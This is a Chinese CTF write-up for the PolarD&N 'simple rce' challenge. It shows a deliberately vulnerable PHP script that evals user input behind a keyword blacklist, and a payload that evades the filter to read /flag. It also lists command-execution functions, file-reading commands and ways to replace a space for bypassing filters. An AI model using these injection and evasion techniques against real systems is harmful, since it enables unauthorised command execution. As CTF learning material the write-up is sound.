---
date: 2001-01-01
tags:
  - Others
categories:
  - Others
title: "[PolarD&N]简单rce"
---
# [PolarD&N]简单rce

【命令执行】

```php
<?php
/*
PolarD&N CTF
*/
highlight_file(__FILE__);
function no($txt){
	# 正则匹配进行过滤
    if(!preg_match("/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i", $txt)){
    return $txt;}
   else{
die("what's up");}}
$yyds=($_POST['yyds']);  
if(isset($_GET['sys'])&&$yyds=='666'){  # GET参数sys必须有值，POST参数yyds==666
  eval(no($_GET['sys']));  # 执行no函数，将sys参数值传入函数
  }
  else
    {echo "nonono";
}
?> nonono
```

![[attachments/Pasted image 20241008215328.png]]

```
# 另一个payload，\t php执行过程中被转义成制表符，但是不会转义\a
?sys=echo(`c\at\t/flag`);
```

#### 补充：
- php 中执行命令的函数
```
system()
passthru()
exec()
shell_exec()
pcntl_exec()
popen()/proc_open()
反引号``
```
- php 中执行代码的函数
```
eval()（特别注意：php中@符号的意思是不报错，即使执行错误，也不报错。）
assert()
call_user_func()
create_function()
array_map()
call_user_func_array()
array_filter()
uasort()函数
preg_replace()
```
- Linux 中可以读取文件的一些命令
```
more：一页一页的显示档案内容
less：与 more 类似
head：查看头几行（可指定行数）
tac：从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail：查看尾几行
nl：显示的时候，顺便输出行号
od：以二进制的方式读取档案内容
vi、vim：文件编辑器
sort：将文件内容排序并输出
uniq：报告或忽略文件中的重复行
```
- 空格替换的几种方式
```
<,<>,${IFS},$IFS，%20(space),%09(tab),$IFS$9,$IFS$1
```

> 参考学习：
> https://blog.csdn.net/weixin_46029520/article/details/130178780
> https://www.cnblogs.com/zhengna/p/15775737.html